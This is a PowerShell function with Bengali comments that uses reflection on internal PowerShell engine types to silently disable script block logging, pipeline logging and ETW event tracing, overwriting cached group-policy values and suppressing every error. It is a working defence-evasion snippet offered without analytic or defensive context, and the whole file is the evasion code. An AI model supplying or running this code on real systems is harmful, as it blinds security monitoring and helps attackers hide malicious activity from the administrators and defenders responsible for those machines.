function Disable-ScriptBlockLogging {
    try {
        $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
        if (-not $utils) { return }

        $gpoField = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
        if (-not $gpoField) { return }

        # ফিল্ডের বর্তমান ভ্যালু নাও
        $current = $gpoField.GetValue($null)

        # PowerShell 5.1 → Hashtable
        if ($current -is [hashtable]) {
            $current['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0 }
            $gpoField.SetValue($null, $current)
        }
        # PowerShell 7+ → ConcurrentDictionary<string, Dictionary<string, object>>
        elseif ($current -is [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Generic.Dictionary[string, System.Object]]]) {
            # Dictionary তৈরি করে AddOrUpdate করো
            $dict = [System.Collections.Generic.Dictionary[string, System.Object]]::new()
            $dict.Add('EnableScriptBlockLogging', [int]0)
            $current.AddOrUpdate('ScriptBlockLogging', $dict, [Func[System.Collections.Generic.Dictionary[string, System.Object], System.Collections.Generic.Dictionary[string, System.Object]]]{
                param($old)
                $old['EnableScriptBlockLogging'] = 0
                return $old
            })
            # SetValue-এর দরকার নেই, কারণ আমরা বর্তমান অবজেক্টকেই মডিফাই করছি
        }
        else {
            # যদি কোনো ভ্যালু না থাকে, তাহলে নতুন ConcurrentDictionary বানিয়ে সেট করো
            $newDict = [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Generic.Dictionary[string, System.Object]]]::new()
            $inner = [System.Collections.Generic.Dictionary[string, System.Object]]::new()
            $inner.Add('EnableScriptBlockLogging', [int]0)
            $newDict.TryAdd('ScriptBlockLogging', $inner) | Out-Null
            $gpoField.SetValue($null, $newDict)
        }
    }
    catch {
        # Silent fail – error এড়াতে
    }

    # বাকি প্যাচগুলো (PipelineLogging, PSEtwLogProvider ইত্যাদি) আগের মতোই থাকবে
    try {
        $pipelineType = [Ref].Assembly.GetType('System.Management.Automation.Logging.PipelineLogging')
        if ($pipelineType) {
            $instanceField = $pipelineType.GetField('_instance', 'NonPublic,Static')
            if ($instanceField) {
                $instance = $instanceField.GetValue($null)
                if ($instance) {
                    $enabledField = $instance.GetType().GetField('_enabled', 'NonPublic,Instance')
                    if ($enabledField) { $enabledField.SetValue($instance, $false) }
                }
            }
        }
    } catch {}

    try {
        $providerType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
        if ($providerType) {
            $etwField = $providerType.GetField('etwProvider', 'NonPublic,Static')
            if ($etwField) {
                $etwProvider = $etwField.GetValue($null)
                if ($etwProvider) {
                    $etwField.SetValue($null, $null)
                }
            }
        }
    } catch {}

    try {
        $logType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLog')
        if ($logType) {
            $enabledField = $logType.GetField('_isEnabled', 'NonPublic,Static')
            if ($enabledField) {
                $enabledField.SetValue($null, $false)
            }
        }
    } catch {}

    try {
        $executionContext = $ExecutionContext
        $contextType = $executionContext.GetType()
        $field = $contextType.GetField('_context', 'NonPublic,Instance')
        if ($field) {
            $context = $field.GetValue($executionContext)
            $logField = $context.GetType().GetField('_logPipelineExecution', 'NonPublic,Instance')
            if ($logField) { $logField.SetValue($context, $false) }
        }
    } catch {}
}
